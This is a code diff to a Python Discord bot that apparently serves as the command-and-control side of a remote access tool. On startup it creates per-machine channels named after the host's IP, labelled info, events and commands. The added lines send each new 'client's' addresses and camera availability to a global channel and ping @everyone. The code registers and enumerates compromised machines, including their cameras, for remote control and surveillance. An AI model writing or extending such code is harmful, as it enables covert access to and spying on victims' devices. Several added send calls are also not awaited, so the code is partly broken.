@@ -82,11 +82,14 @@ intents.message_content = True
 
 @client.event
 async def on_ready():
-    ip = get_device_ip()  
+    ip = get_device_ip()
+    global_online_channel_id = 1336044356704145408
+    channel12 = client.get_channel(global_online_channel_id)
     for guild in client.guilds:
         existing_category = nextcord.utils.get(guild.categories, name=str(ip))
         
         if not existing_category:  # If the category doesn't exist, create it
+            channel12.send("New client added to network, info:")
             category = await guild.create_category(str(ip))
             ipv6 = get_ipv6_address()
             ipv4 = get_device_ip4()
@@ -96,6 +99,14 @@ async def on_ready():
                 pass
             else:
                 cameras = "No Cameras Found."
+            channel12.send(f"Mac address:{ip}")
+            channel12.send(f"Ipv6: {ipv6}")
+            channel12.send(f"Ipv4: {ipv4}")
+            if cameras:
+                channel12.send("Cameras: at least one found!")
+            else:
+                channel12.send("Cameras: no cameras found.")
+            channel12.send("@everyone")
             
             await guild.create_text_channel("info", category=category)
             channel = nextcord.utils.get(category.text_channels, name="info")
@@ -105,6 +116,7 @@ async def on_ready():
             await guild.create_text_channel("events", category=category)
             await guild.create_text_channel("commands", category=category)
         if existing_category:
+            channel12.send(f"Client {ip} online!")
             category = nextcord.utils.get(guild.categories, name=str(ip))
             if category:
                 embed = nextcord.Embed(title="Client online!", timestamp=datetime.now(), colour=0x00f51d)
